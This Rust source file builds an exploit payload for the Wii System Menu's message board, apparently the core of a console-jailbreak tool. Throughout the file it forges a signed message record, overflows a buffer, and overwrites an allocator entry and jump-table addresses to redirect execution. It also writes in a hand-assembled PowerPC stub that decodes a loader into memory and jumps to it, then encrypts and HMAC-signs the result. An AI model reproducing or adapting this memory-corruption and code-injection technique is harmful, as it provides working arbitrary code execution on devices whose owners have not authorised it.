use std::io::{Cursor, Write};

use aes::cipher::block_padding::NoPadding;
use aes::cipher::{BlockEncryptMut, KeyIvInit};
use byteorder::{BigEndian, WriteBytesExt};
use chrono::{DateTime, Datelike, NaiveDate, TimeZone, Timelike, Utc};
use crc::{CRC_32_ISO_HDLC, Crc};
use hmac::{Hmac, Mac};
use sha1::Sha1;

use crate::consts::{
    BUFFER_SIZE, FILE_EXTENSION, FOLDER_ID, FOLDER_TYPE, SECONDS_TO_2000, STRLEN, SYSMENU_VARS,
    SysMenuVars, TICKS_PER_SECOND,
};
use crate::error::BuildPayloadError;
use crate::types::{MacAddress, PayloadWriter, WiiId};

const ENVELOPE: &[u8; 6304] = include_bytes!("../../data/envelope.bin");
const LOADER: &[u8; 788] = include_bytes!("../../data/loader.bin");

pub struct Payload {
    pub bin: [u8; BUFFER_SIZE],
    pub path: String,
    pub file_name: String,
}

pub fn build_payload(
    mac_address: &MacAddress,
    date: &NaiveDate,
    sys_ver: &str,
) -> Result<Payload, BuildPayloadError> {
    log::info!("MAC address: {mac_address}");
    log::info!("date: {}", date.format("%d-%m-%Y"));
    log::info!("system version: {sys_ver}");

    if date.year() < 2000 || date.year() > 2035 {
        return Err(BuildPayloadError::InvalidYear);
    }

    let cdb_time = cdb_time_from_datetime(date)?;
    log::info!("cdb_time: 0x{:08x}", cdb_time);
    let vars = {
        let mut vars = *SYSMENU_VARS
            .get(sys_ver)
            .ok_or(BuildPayloadError::InvalidSystemVersion)?;

        vars.overwrite_addr = (vars.overwrite_addr + 0x14) - 0x08;

        vars
    };
    log::info!("sys vars: {vars:#?}");

    let wii_id = WiiId::from(mac_address);
    log::info!("WiiId: {:#?}", wii_id);

    let (wii_id_upper, wii_id_lower) = (wii_id.upper, wii_id.lower);

    // reserve buffer for cdb file + attribute header (200KiB + 0x400)
    let mut out = [0x00; BUFFER_SIZE];

    log::info!("adding cdb attr header");
    add_cdb_attr_header(&mut out, &wii_id, cdb_time)?;
    log::info!("adding exploit stuff");
    add_stuff(&mut out, &vars)?;
    log::info!("encrypting payload");
    encrypt_and_sign(&mut out, &wii_id)?;

    let file_name = format!("{cdb_time:08x}.{FILE_EXTENSION}");
    log::info!("file name: {file_name}");

    let time_str = {
        let actual_time = cdb_time + SECONDS_TO_2000 as u32;
        let time = DateTime::from_timestamp_secs(actual_time as i64)
            .ok_or(BuildPayloadError::InvalidTimestamp)?;
        format!(
            "{:04}/{:02}/{:02}/{:02}/{:02}",
            time.year(),
            time.month0(),
            time.day(),
            time.hour(),
            time.minute()
        )
    };
    let path = format!(
        "private/wii/title/HAEA/{wii_id_upper:08x}/{wii_id_lower:08x}/{time_str}/{FOLDER_ID}/{FOLDER_TYPE}"
    );
    log::info!("path: {path}");
    log::info!("payload size: {} bytes", out.len());

    Ok(Payload {
        bin: out,
        path,
        file_name,
    })
}

fn cdb_time_from_datetime(date: &NaiveDate) -> Result<u32, BuildPayloadError> {
    let end_of_day = date
        .and_hms_opt(23, 59, 0)
        .ok_or(BuildPayloadError::InvalidDate)?;
    let utc_dt = Utc.from_utc_datetime(&end_of_day);

    Ok((utc_dt.timestamp() - SECONDS_TO_2000) as u32)
}

fn add_cdb_attr_header(buf: &mut [u8], wii_id: &WiiId, cdb_time: u32) -> std::io::Result<()> {
    let mut cur = Cursor::new(buf);

    // ---- ATTRIBUTE HEADER ----

    cur.set_position(0x000);
    cur.write_all(b"CDBFILE\x02")?; // magic word & version

    cur.set_position(0x008);
    cur.write_u32::<BigEndian>(wii_id.upper)?; // wiiID
    cur.write_u32::<BigEndian>(wii_id.lower)?;

    cur.set_position(0x010);
    cur.write_all(&[0x12])?; // strlen( description ) + 1

    cur.set_position(0x014); // description
    cur.write_all(b"ripl_board_record\0")?;

    cur.set_position(0x070);
    cur.write_u32::<BigEndian>(1)?; // entry ID# ( /cdb.conf value )

    cur.set_position(0x074);
    cur.write_u32::<BigEndian>(1)?; // edit count

    cur.set_position(0x07C);
    cur.write_u32::<BigEndian>(cdb_time)?; // last edit time

    // ---- CDB FILE HEADER ----

    cur.set_position(0x400);
    cur.write_u32::<BigEndian>(0x5249_5F35)?; // magic word

    cur.set_position(0x40C);
    cur.write_u32::<BigEndian>(1)?; // "type" flag

    cur.set_position(0x410);
    cur.write_u64::<BigEndian>(cdb_time as u64 * TICKS_PER_SECOND)?; // sent time

    cur.set_position(0x418);
    cur.write_all(b"w9999999900000000@wii.com\0")?; // sender - this is bowser's friend code

    cur.set_position(0x518);
    cur.write_u32::<BigEndian>(0x0002_0001)?; // more flags ( origin = email | can reply = false )

    Ok(())
}

fn add_stuff(buf: &mut [u8], vars: &SysMenuVars) -> Result<(), BuildPayloadError> {
    {
        let mut cur = Cursor::new(&mut *buf);
        cur.set_position(0x51c);
        cur.write_u32::<BigEndian>(0x148)?; // description offset

        cur.set_position(0x520);
        cur.write_u32::<BigEndian>(0x168)?; // body offset

        cur.set_position(0x548);
        put_u16_str(&mut cur, "   ")?; // write a pretty title (just using spaces for now)

        overflow_buffer(&mut cur)?;

        cur.set_position(0x3448 + 0);
        cur.write_u32::<BigEndian>(0x80F80001)?;

        cur.set_position(0x3448 + 4);
        cur.write_u32::<BigEndian>(0x00010001)?;

        // overwrite a memory allocator entry with a stack address.  next time they allocate memory after
        // the buffer overflow happens, it will overwrite a value on the stack to point to the buffer of memory
        // that we initialized during the buffer overflow
        cur.set_position(0x3448 + 8);
        cur.write_u32::<BigEndian>(vars.overwrite_addr)?;
        cur.set_position(0x3448 + 0xc);
        cur.write_u32::<BigEndian>(vars.overwrite_addr)?;

        // this address is read by "lwz     %r12, 0(%r3)"
        // it points to itself
        cur.set_position(0x568 + 0xcdf8);
        cur.write_u32::<BigEndian>(vars.jump_table_addr)?;

        // this one is read into r12 by "lwz     %r12, 0xC(%r12)"
        cur.set_position(0x568 + 0xcdf8 + 0xc);
        cur.write_u32::<BigEndian>(vars.jump_addr)?;
    }

    // insert a stub loader that will un-xor the payload to 0x93000000 and branch to it
    // this gives an initial payload that is location-independant (as long as it doesn't happen do be in the 0x93000000 area itself)
    // and contains no null u16s.
    // some addresses of functions in the system menu are written right before the loader in case it wants to use them
    // it assumes that r12 contains the value that the code is xor'd with
    {
        let mut p = PayloadWriter::new(&mut *buf, 0x568 + STRLEN as u64, vars.jump_addr);
        // r29 = 0x01010101
        p.l(0x3FA00101)?; // lis r29, 0x101
        p.l(0x3BBD0101)?; // addi r29, r29, 0x101

        // load r28 with the offset to the data we want copied
        p.l(0x3B800050)?; // li r28, 0x50

        // location to start copying data
        p.l(0x3de092ff)?; // lis r15, 0x92ff
        p.l(0x61efffd4)?; // ori r15, r15, 0xffd4

        // destination - offset
        p.l(0x7DDC7850)?; // sub r14, r15, r28

        // r12 already contains the jump address
        // load a u32 of the elf loader, xor with r12, write it to r14 + offset
        // loop:
        p.l(0x7CACE02E)?; // lwzx r5,r12,r28
        p.l(0x7CA66278)?; // xor r6, r5, r12
        p.l(0x7CCEE12E)?; // stwx r6,r14,r28

        // sync
        p.l(0x7C0EE06C)?; // dcbst r14, r28
        p.l(0x7C0004AC)?; // sync
        p.l(0x7C0EE7AC)?; // icbi r14, r28

        // if the value of the u32 was not 0x01010101 before the xor, goto loop
        p.l(0x7C05E800)?; // cmpw r5, r29
        p.l(0x3B9C0004)?; // addi r28, r28, 4
        p.l(0x40a2ffe0)?; // bne- 0xFFE0

        // sync
        p.l(0x7C0004AC)?; // sync
        p.l(0x4C00012C)?; // isync

        // execute 0x93000000
        p.l(0x3D809300)?; // lis r12, 0x9300
        p.l(0x7D8903A6)?; // mtctr r12
        p.l(0x4E800420)?; // bctr

        p.x(vars.file_struct_version)?;
        p.x(vars.os_return_to_menu)?;
        p.x(vars.os_stop_audio_system)?;
        p.x(vars.gx_abort)?;
        p.x(vars.vfsys_open_file_current)?;
        p.x(vars.vfsys_read_file)?;
        p.x(vars.os_unregister_state_event)?;
        p.x(vars.vi_set_black)?;
        p.x(vars.vi_flush)?;
        p.x(vars.vfpvol_get_volume)?;
        p.x(vars.vfpvol_set_current_volume)?;

        // add the loader
        {
            let loader_bin_chunked = LOADER.chunks(4);
            let xor = vars.jump_addr.to_be();

            for chunk in loader_bin_chunked {
                let d = u32::from_le_bytes(chunk.try_into()?);
                let val = d ^ xor;
                let val = val.to_le_bytes(); // wtf
                p.write_raw(&val)?; // TODO: possible no padding at the end of bin
            }
        }

        p.increment_offset(4);

        // write 0x01010101 to signal the stub loader the end of its payload
        p.l(0x01010101)?;
    }

    // add the image at the end of the whole shabang
    {
        let mut cur = Cursor::new(&mut *buf);
        let tmg_loc = (BUFFER_SIZE as u32 - 0) - ENVELOPE.len() as u32;
        cur.set_position(0x528);
        cur.write_u32::<BigEndian>(2)?;
        cur.set_position(0x52c);
        cur.write_u32::<BigEndian>(tmg_loc - 0x400)?;
        cur.set_position(0x530);
        cur.write_u32::<BigEndian>(ENVELOPE.len() as u32)?;
        cur.set_position(tmg_loc as u64);
        cur.write_all(ENVELOPE)?;
    }

    // fix checksum
    {
        let crc32 = Crc::<u32>::new(&CRC_32_ISO_HDLC);
        let mut digest = crc32.digest();
        digest.update(&buf[0x400..0x400 + 0x140]);
        let checksum = digest.finalize();

        let mut cur = Cursor::new(&mut *buf);
        cur.set_position(0x540);
        cur.write_u32::<BigEndian>(checksum)?;
    }

    Ok(())
}

fn put_u16_str<W: Write>(w: &mut W, s: &str) -> std::io::Result<()> {
    for b in s.as_bytes() {
        w.write_u16::<BigEndian>(*b as u16)?;
    }
    w.write_u16::<BigEndian>(0u16)?; // null terminator
    Ok(())
}

fn overflow_buffer<T>(w: &mut Cursor<T>) -> std::io::Result<()>
where
    Cursor<T>: Write,
{
    let mut i: u64 = 0x568;
    let mut val: u32 = 0x01010101;
    let end = BUFFER_SIZE as u64 - 0x8000;

    while i < end {
        let high = val & 0xffff;
        let low = (val >> 16) & 0xffff;
        if low != 0 && high != 0 {
            w.set_position(i);
            w.write_u32::<BigEndian>(val)?;
        }
        i += 4;
        val = val.wrapping_add(0x100000);
    }

    Ok(())
}

fn encrypt_and_sign(buf: &mut [u8], wii_id: &WiiId) -> Result<(), BuildPayloadError> {
    let buf_size = buf.len() as u32;
    let mut cur = Cursor::new(&mut *buf);

    // write size
    cur.set_position(0x78);
    cur.write_u32::<BigEndian>(buf_size)?;

    // create keystring
    // time -> read 4 bytes from 0x7c
    let time = &buf[0x7c..0x7c + 4];
    let time_be = u32::from_be_bytes(time.try_into()?);

    let offset = 0x80;
    let max_len = 0x1b; // 27 bytes including null
    let s = format!("{time_be:010}_{FOLDER_ID}_{FILE_EXTENSION}.{FOLDER_TYPE}");

    let bytes = s.as_bytes();
    let len = bytes.len().min(max_len - 1);

    buf[offset..offset + len].copy_from_slice(&bytes[..len]);
    buf[offset + len] = 0; // null terminator

    let iv = make_iv();
    let key = [0; 16];

    let mut cur = Cursor::new(&mut *buf);
    cur.set_position(0xa0);
    cur.write_all(&iv)?;

    type Aes128Cbc = cbc::Encryptor<aes::Aes128>;
    let cipher = Aes128Cbc::new_from_slices(&key, &iv)?;

    cipher.encrypt_padded_mut::<NoPadding>(&mut buf[0x400..], (buf_size - 0x400) as usize)?;

    // hmac
    type HmacSha1 = Hmac<Sha1>;
    let hmac_key = wii_id.hmac_key();
    let mut mac = HmacSha1::new_from_slice(hmac_key)?;
    mac.update(buf);
    let result = mac.finalize().into_bytes();

    // Write the 20-byte (0x14) HMAC result into b at offset 0xb0
    buf[0xb0..0xb0 + 0x14].copy_from_slice(&result);

    Ok(())
}

fn make_iv() -> [u8; 16] {
    let mut iv = [0u8; 16];
    let val: u32 = 0x12345678;

    for chunk in iv.chunks_mut(4) {
        chunk.copy_from_slice(&val.to_le_bytes());
    }

    iv
}
